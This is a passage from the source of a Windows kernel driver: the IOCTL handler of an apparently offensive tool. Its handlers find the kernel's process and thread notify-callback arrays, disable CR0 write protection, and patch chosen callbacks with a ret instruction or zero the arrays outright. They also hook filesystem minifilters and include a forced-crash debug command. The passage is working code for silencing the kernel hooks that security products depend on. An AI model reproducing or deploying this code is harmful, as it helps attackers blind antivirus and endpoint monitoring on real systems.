                InterlockedExchangePointer(&g_OrigPcreateProcessNotifyRoutine, NULL);

                LOG("[-] Failed hook PS notify callback");
                break;
            }

            InterlockedExchange(&g_startHookFilterPS, TRUE);

            break;
        }

        case IOCTL_DOBRO_UNHOOK_CALLBACK_PS:
        {
            if (g_typePsNotifyCallback == TYPE_EMPTY_NOTIFY)
            {
                status = STATUS_ALREADY_REGISTERED;
                break;
            }

            InterlockedExchange(&g_startHookFilterPS, FALSE);

            if (g_typePsNotifyCallback == TYPE_PS_NOTIFY_EX2)
            {
                status = PsSetCreateProcessNotifyRoutineEx2(PsCreateProcessNotifySubsystems, PcreateProcessNotifyRoutineEx2, TRUE);
                status = PsSetCreateProcessNotifyRoutineEx2(PsCreateProcessNotifySubsystems, g_OrigPcreateProcessNotifyRoutine, FALSE);
            }
            else if (g_typePsNotifyCallback == TYPE_PS_NOTIFY_EX)
            {
                status = PsSetCreateProcessNotifyRoutineEx(PcreateProcessNotifyRoutineEx, TRUE);
                status = PsSetCreateProcessNotifyRoutineEx((PCREATE_PROCESS_NOTIFY_ROUTINE_EX)g_OrigPcreateProcessNotifyRoutine, FALSE);
            }
            else if (g_typePsNotifyCallback == TYPE_PS_NOTIFY)
            {
                status = PsSetCreateProcessNotifyRoutine(PcreateProcessNotifyRoutine, TRUE);
                status = PsSetCreateProcessNotifyRoutine((PCREATE_PROCESS_NOTIFY_ROUTINE)g_OrigPcreateProcessNotifyRoutine, FALSE);
            }
            else
            {
                status = STATUS_UNSUCCESSFUL;
            }

            InterlockedExchange(&g_typePsNotifyCallback, TYPE_EMPTY_NOTIFY);
            InterlockedExchangePointer(&g_OrigPcreateProcessNotifyRoutine, NULL);

            break;
        }

        case IOCTL_DOBRO_HOOK_CALLBACK_THR:
        {
            if (g_typeThrNotifyCallback != TYPE_EMPTY_NOTIFY)
            {
                status = STATUS_ALREADY_REGISTERED;
                break;
            }

            DobroData* dobroData = (DobroData*)inBuf;
            dobroData->wcModuleName[DEF_MOD_NAME_LEN_SYM - 1] = L'\0';
            wcscpy_s(g_filteredThrName, DEF_MOD_NAME_LEN_SYM, dobroData->wcModuleName);

            INFO_NOTIFY_CALLBACK iNC;
            bool bRet = ThrDeleteNotifyCallback(inBuf, &iNC);
            if (!bRet)
            {
                LOG("[-] Failed hook THR notify callback");
                break;
            }

            InterlockedExchange(&g_typeThrNotifyCallback, iNC.Type);
            InterlockedExchangePointer(&g_OrigPcreateThreadNotifyRoutine, (PVOID)iNC.NotifyAddress);

            if (iNC.Type == TYPE_THREAD_NOTIFY)
                status = PsSetCreateThreadNotifyRoutine(PcreateThreadNotifyRoutine);
            else
                status = STATUS_UNSUCCESSFUL;

            if (!NT_SUCCESS(status))
            {
                InterlockedExchange(&g_typeThrNotifyCallback, TYPE_EMPTY_NOTIFY);
                InterlockedExchangePointer(&g_OrigPcreateThreadNotifyRoutine, NULL);

                LOG("[-] Failed hook THR notify callback");
                break;
            }

            InterlockedExchange(&g_startHookFilterThr, TRUE);

            status = STATUS_SUCCESS;
            break;
        }

        case IOCTL_DOBRO_UNHOOK_CALLBACK_THR:
        {
            if (g_typeThrNotifyCallback == TYPE_EMPTY_NOTIFY)
            {
                status = STATUS_ALREADY_REGISTERED;
                break;
            }

            InterlockedExchange(&g_startHookFilterThr, FALSE);

            if (g_typeThrNotifyCallback == TYPE_THREAD_NOTIFY)
            {
                status = PsRemoveCreateThreadNotifyRoutine(PcreateThreadNotifyRoutine);
                status = PsSetCreateThreadNotifyRoutine((PCREATE_THREAD_NOTIFY_ROUTINE)g_OrigPcreateThreadNotifyRoutine);
            }
            else
            {
                status = STATUS_UNSUCCESSFUL;
            }

            InterlockedExchange(&g_typeThrNotifyCallback, TYPE_EMPTY_NOTIFY);
            InterlockedExchangePointer(&g_OrigPcreateThreadNotifyRoutine, NULL);

            break;
        }

        case IOCTL_DOBRO_DBG_BSOD:
        {
            KeBugCheck(0xDEADBEEF);
            break;
        }
       
        case IOCTL_DOBRO_DBG_LIST_MODULES:
	    {
		    status = DisplayModules();
		    break;
	    }

	    case IOCTL_DOBRO_PROCESS_DELETE_CALLBACK:
	    {
            INFO_NOTIFY_CALLBACK iNC;
            bool bRet = PsDeleteNotifyCallback(inBuf, &iNC);
            if (bRet)
                status = STATUS_SUCCESS;

		    break;
	    }

	    case IOCTL_DOBRO_THREAD_DELETE_CALLBACK:
	    {
            INFO_NOTIFY_CALLBACK iNC;
            bool bRet = ThrDeleteNotifyCallback(inBuf, &iNC);
            if (bRet)
                status = STATUS_SUCCESS;

		    break;
	    }

	    case IOCTL_DOBRO_PROCESS_CALLBACK_RET:
	    {
		    ULONG64	PspCreateProcessNotifyRoutine = FindPspCreateProcessNotifyRoutine();
		    if (!PspCreateProcessNotifyRoutine)
                break;

		    int i = 0;
		    ULONG64	NotifyAddr = 0, MagicPtr = 0;
            DobroData* data = (DobroData*)inBuf;

		    for (i = 0; i < 64; i++)
		    {
			    MagicPtr = PspCreateProcessNotifyRoutine + i * 8;
			    NotifyAddr = *(PULONG64)(MagicPtr);
			    if (MmIsAddressValid((PVOID)NotifyAddr) && NotifyAddr != 0)
			    {
				    NotifyAddr = *(PULONG64)(NotifyAddr & 0xfffffffffffffff8);
				    LOG("[%d] CreateProcessNotifyRoutine: %llx", i, NotifyAddr);

				    if (data->index == i)
				    {
					    int LogicalProcessorsCount = KeQueryActiveProcessorCount(0);

					    for (ULONG64 processorIndex = 0; processorIndex < LogicalProcessorsCount; processorIndex++)
					    {
						    KAFFINITY oldAffinity = KeSetSystemAffinityThreadEx((KAFFINITY)(1i64 << processorIndex));
						    CR0_WP_OFF_x64();
						    KeRevertToUserAffinityThreadEx(oldAffinity);
					    }

					    PULONG64 pPointer = (PULONG64)NotifyAddr;
					    memcpy((g_ProcessStoreAddress + i * 8), pPointer, 8);
					    *pPointer = (ULONG64)0xc3;

					    for (ULONG64 processorIndex = 0; processorIndex < LogicalProcessorsCount; processorIndex++)
					    {
						    KAFFINITY oldAffinity = KeSetSystemAffinityThreadEx((KAFFINITY)(1i64 << processorIndex));
						    CR0_WP_ON_x64();
						    KeRevertToUserAffinityThreadEx(oldAffinity);
					    }

                        status = STATUS_SUCCESS;
					    break;
				    }
			    }
		    }

		    break;
	    }

	    case IOCTL_DOBRO_THREAD_CALLBACK_RET:
	    {
		    ULONG64	PspCreateThreadNotifyRoutine = FindPsSetCreateThreadNotifyRoutine();
		    if (!PspCreateThreadNotifyRoutine)
                break;

		    int i = 0;
		    ULONG64	NotifyAddr = 0, MagicPtr = 0;
            DobroData* data = (DobroData*)inBuf;

		    for (i = 0; i < 64; i++)
		    {
			    MagicPtr = PspCreateThreadNotifyRoutine + i * 8;
			    NotifyAddr = *(PULONG64)(MagicPtr);

			    if (MmIsAddressValid((PVOID)NotifyAddr) && NotifyAddr != 0)
			    {
				    NotifyAddr = *(PULONG64)(NotifyAddr & 0xfffffffffffffff8);
				    LOG("[%d] CreateThreadNotifyRoutine: %llx", i, NotifyAddr);

				    if (data->index == i)
				    {
					    int LogicalProcessorsCount = KeQueryActiveProcessorCount(0);

					    for (ULONG64 processorIndex = 0; processorIndex < LogicalProcessorsCount; processorIndex++)
					    {
						    KAFFINITY oldAffinity = KeSetSystemAffinityThreadEx((KAFFINITY)(1i64 << processorIndex));
						    CR0_WP_OFF_x64();
						    KeRevertToUserAffinityThreadEx(oldAffinity);
					    }

					    PULONG64 pPointer = (PULONG64)NotifyAddr;
					    memcpy((g_ThreadStoreAddress + i * 8), pPointer, 8);
					    *pPointer = (ULONG64)0xc3;

					    for (ULONG64 processorIndex = 0; processorIndex < LogicalProcessorsCount; processorIndex++)
					    {
						    KAFFINITY oldAffinity = KeSetSystemAffinityThreadEx((KAFFINITY)(1i64 << processorIndex));
						    CR0_WP_ON_x64();
						    KeRevertToUserAffinityThreadEx(oldAffinity);
					    }

                        status = STATUS_SUCCESS;
                        break;
				    }
			    }
		    }

		    break;
	    }

	    case IOCTL_DOBRO_PROCESS_ROLLBACK_RET:
	    {
		    ULONG64	PspCreateProcessNotifyRoutine = FindPspCreateProcessNotifyRoutine();
		    if (!PspCreateProcessNotifyRoutine)
			    break;

		    int i = 0;
		    ULONG64	NotifyAddr = 0, MagicPtr = 0;
            DobroData* data = (DobroData*)inBuf;

		    for (i = 0; i < 64; i++)
		    {
			    MagicPtr = PspCreateProcessNotifyRoutine + i * 8;
			    NotifyAddr = *(PULONG64)(MagicPtr);

			    if (MmIsAddressValid((PVOID)NotifyAddr) && NotifyAddr != 0)
			    {
				    NotifyAddr = *(PULONG64)(NotifyAddr & 0xfffffffffffffff8);
				    LOG("[%d] CreateProcessNotifyRoutine: %llx", i, NotifyAddr);

				    if (data->index == i)
				    {
					    int LogicalProcessorsCount = KeQueryActiveProcessorCount(0);

					    for (ULONG64 processorIndex = 0; processorIndex < LogicalProcessorsCount; processorIndex++)
					    {
						    KAFFINITY oldAffinity = KeSetSystemAffinityThreadEx((KAFFINITY)(1i64 << processorIndex));
						    CR0_WP_OFF_x64();
						    KeRevertToUserAffinityThreadEx(oldAffinity);
					    }

					    PULONG64 pPointer = (PULONG64)NotifyAddr;
					    memcpy(pPointer,(g_ProcessStoreAddress + i * 8),8);

					    for (ULONG64 processorIndex = 0; processorIndex < LogicalProcessorsCount; processorIndex++)
					    {
						    KAFFINITY oldAffinity = KeSetSystemAffinityThreadEx((KAFFINITY)(1i64 << processorIndex));
						    CR0_WP_ON_x64();
						    KeRevertToUserAffinityThreadEx(oldAffinity);
					    }

                        status = STATUS_SUCCESS;
                        break;
				    }
			    }
		    }

		    break;
	    }

	    case IOCTL_DOBRO_THREAD_ROLLBACK_RET:
	    {
		    ULONG64	PspCreateThreadNotifyRoutine = FindPsSetCreateThreadNotifyRoutine();
		    if (!PspCreateThreadNotifyRoutine)
			    break;

		    int i = 0;
		    ULONG64	NotifyAddr = 0, MagicPtr = 0;
            DobroData* data = (DobroData*)inBuf;

		    for (i = 0; i < 64; i++)
		    {
			    MagicPtr = PspCreateThreadNotifyRoutine + i * 8;
			    NotifyAddr = *(PULONG64)(MagicPtr);

			    if (MmIsAddressValid((PVOID)NotifyAddr) && NotifyAddr != 0)
			    {
				    NotifyAddr = *(PULONG64)(NotifyAddr & 0xfffffffffffffff8);
				    LOG("[%d] CreateThreadNotifyRoutine: %llx", i, NotifyAddr);

				    if (data->index == i)
				    {
					    int LogicalProcessorsCount = KeQueryActiveProcessorCount(0);

					    for (ULONG64 processorIndex = 0; processorIndex < LogicalProcessorsCount; processorIndex++)
					    {
						    KAFFINITY oldAffinity = KeSetSystemAffinityThreadEx((KAFFINITY)(1i64 << processorIndex));
						    CR0_WP_OFF_x64();
						    KeRevertToUserAffinityThreadEx(oldAffinity);
					    }

					    PULONG64 pPointer = (PULONG64)NotifyAddr;
					    memcpy(pPointer, (g_ThreadStoreAddress + i * 8), 8);

					    for (ULONG64 processorIndex = 0; processorIndex < LogicalProcessorsCount; processorIndex++)
					    {
						    KAFFINITY oldAffinity = KeSetSystemAffinityThreadEx((KAFFINITY)(1i64 << processorIndex));
						    CR0_WP_ON_x64();
						    KeRevertToUserAffinityThreadEx(oldAffinity);
					    }

                        status = STATUS_SUCCESS;	
                        break;
				    }
			    }
		    }
	    
            break;
	    }

	    case IOCTL_DOBRO_PROCESS_ZEROOUT_ARRAY:
	    {
		    ULONG64	PspCreateProcessNotifyRoutine = FindPspCreateProcessNotifyRoutine();
		    if (!PspCreateProcessNotifyRoutine)
			    break;

		    int i = 0;
		    ULONG64	NotifyAddr = 0, MagicPtr = 0;
            DobroData* data = (DobroData*)inBuf;

		    for (i = 0; i < 64; i++)
		    {
			    MagicPtr = PspCreateProcessNotifyRoutine + i * 8;
			    NotifyAddr = *(PULONG64)(MagicPtr);

			    if (MmIsAddressValid((PVOID)NotifyAddr) && NotifyAddr != 0)
			    {
				    if (data->list)
				    {
					    NotifyAddr = *(PULONG64)(NotifyAddr & 0xfffffffffffffff8);
					    LOG("[%d] CreateProcessNotifyRoutine: %llx", i, NotifyAddr);
				    }

				    if (data->remove)
					    *(PULONG64)(MagicPtr) = 0;
			    }
		    }

            status = STATUS_SUCCESS;
            break;
	    }

	    case IOCTL_DOBRO_THREAD_ZEROOUT_ARRAY:
	    {
		    ULONG64	PspCreateThreadNotifyRoutine = FindPsSetCreateThreadNotifyRoutine();
		    if (!PspCreateThreadNotifyRoutine)
			    break;

		    int i = 0;
		    ULONG64	NotifyAddr = 0, MagicPtr = 0;
            DobroData* data = (DobroData*)inBuf;

		    for (i = 0; i < 64; i++)
		    {
			    MagicPtr = PspCreateThreadNotifyRoutine + i * 8;
			    NotifyAddr = *(PULONG64)(MagicPtr);

			    if (MmIsAddressValid((PVOID)NotifyAddr) && NotifyAddr != 0)
			    {
				    if (data->list)
				    {
					    NotifyAddr = *(PULONG64)(NotifyAddr & 0xfffffffffffffff8);
					    LOG("[%d] CreateProcessNotifyRoutine: %llx", i, NotifyAddr);
				    }

				    if (data->remove)
					    *(PULONG64)(MagicPtr) = 0;
			    }
		    }

            status = STATUS_SUCCESS;
		    break;
	    }
        
        case IOCTL_DOBRO_HOOK_MINIFILTER:
	    {
            DobroData* data = (DobroData*)inBuf;

            PWCHAR name = FSH_GetFSMinifilterByIndex(data->index);
            if (name == NULL)
            {
                status = STATUS_INVALID_PARAMETER;
                break;
            }

            UNICODE_STRING usNameMinifilter;
            usNameMinifilter.Buffer = name;
            usNameMinifilter.Length = (USHORT)(::wcslen(name) * sizeof(WCHAR));
            usNameMinifilter.MaximumLength = usNameMinifilter.Length;

            status = FSH_Hook(&usNameMinifilter);

		    break;
        }

        case IOCTL_DOBRO_UNHOOK_MINIFILTER:
        {
            status = FSH_UnHook();
            break;
        }

        case IOCTL_DOBRO_GET_LIST_ALL:
        {
            int rc = GetAllList(outBuf, outBufLength);
            if (rc >= 0)
            {
                numWritten = rc;
                status = STATUS_SUCCESS;
            }

            break;
        }

        default:
        {
            status = STATUS_INVALID_DEVICE_REQUEST;
            break;
        }
	}

End:
	Irp->IoStatus.Status = status;
	Irp->IoStatus.Information = numWritten;
	IoCompleteRequest(Irp, IO_NO_INCREMENT);

	return status;
}

